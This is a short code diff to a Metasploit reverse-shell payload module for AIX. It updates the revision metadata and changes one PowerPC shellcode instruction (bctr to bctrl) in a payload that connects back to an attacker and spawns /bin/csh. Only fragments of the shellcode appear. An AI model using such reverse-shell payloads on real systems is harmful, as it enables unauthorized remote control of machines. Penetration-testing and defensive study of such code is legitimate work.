@@ -1,5 +1,5 @@
 ##
-# $Id: shell_reverse_tcp.rb 6698 2009-06-23 03:49:25Z ramon $
+# $Id: shell_reverse_tcp.rb 6911 2009-07-28 04:46:57Z ramon $
 ##
 
 ##
@@ -23,7 +23,7 @@ module Metasploit3
 	def initialize(info = {})
 		super(merge_info(info,
 			'Name'          => 'AIX Command Shell, Reverse TCP Inline',
-			'Version'       => '$Revision: 6698 $',
+			'Version'       => '$Revision: 6911 $',
 			'Description'   => 'Connect back to attacker and spawn a command shell',
 			'Author'        => 'Ramon de Carvalho Valle <ramon[at]risesecurity.org>',
 			'License'       => MSF_LICENSE,
@@ -95,7 +95,7 @@ module Metasploit3
 		"\x7c\x24\x0b\x78"     +#   mr      r4,r1                      #
 		@cal_execve +
 		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
-		"\x4e\x80\x04\x20"     +#   bctr                               #
+		"\x4e\x80\x04\x21"     +#   bctrl                              #
 		"/bin/csh"
 
 	end
